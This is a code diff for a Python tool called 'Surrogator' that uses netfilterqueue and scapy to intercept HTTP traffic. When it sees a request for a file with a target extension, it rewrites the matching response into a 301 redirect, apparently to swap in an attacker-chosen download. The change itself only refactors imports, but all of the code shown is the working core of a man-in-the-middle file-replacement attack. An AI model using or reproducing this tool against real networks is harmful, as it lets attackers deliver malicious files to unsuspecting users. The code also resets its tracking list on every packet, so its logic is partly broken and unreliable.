@@ -14,6 +14,7 @@ identified by cross-matching the seq/ack.
 import subprocess
 import netfilterqueue
 import scapy.all as scapy
+from scapy.layers.inet import IP, TCP
 from utils.instantiate_queue import instantiate_queue
 
 class Surrogator:
@@ -30,9 +31,9 @@ class Surrogator:
         returns said modified response.
         """
         packet[scapy.Raw].load = load
-        del packet[scapy.IP].len
-        del packet[scapy.IP].chksum
-        del packet[scapy.TCP].chksum
+        del packet[IP].len
+        del packet[IP].chksum
+        del packet[TCP].chksum
         return packet
 
     def process_packet(self, packet): 
@@ -45,20 +46,20 @@ class Surrogator:
         ack_list = []
         redirect_header = "HTTP/1.1 301 Moved Permanently\nLocation: {i}\n\n".format(i=self.redirect_url)
         # wrap payload packet in Scapy IP layer
-        scapy_packet_obj = scapy.IP(packet.get_payload())
+        scapy_packet_obj = IP(packet.get_payload())
         if (scapy_packet_obj.haslayer(scapy.Raw)):
             load = scapy_packet_obj[scapy.Raw].load
             # request obj
-            if (scapy_packet_obj[scapy.TCP].dport == 10000):
+            if (scapy_packet_obj[TCP].dport == 10000):
                 print(load)
                 # ensure our url is not in load to prevent infinite loop
                 if (self.target_extension in load and self.redirect_url not in load):
                     print("[+] File Request")
-                    ack_list.append(scapy_packet_obj[scapy.TCP].ack)
+                    ack_list.append(scapy_packet_obj[TCP].ack)
             # response obj
-            elif (scapy_packet_obj[scapy.TCP].sport == 10000): 
-                if (scapy_packet_obj[scapy.TCP].seq in ack_list):
-                    ack_list.remove(scapy_packet_obj[scapy.TCP].seq)
+            elif (scapy_packet_obj[TCP].sport == 10000): 
+                if (scapy_packet_obj[TCP].seq in ack_list):
+                    ack_list.remove(scapy_packet_obj[TCP].seq)
                     print("[+] Supplanting file(s)...")   
                     generated_packet = self.generate_load(scapy_packet_obj, redirect_header)
                     # distill into original packet obj 
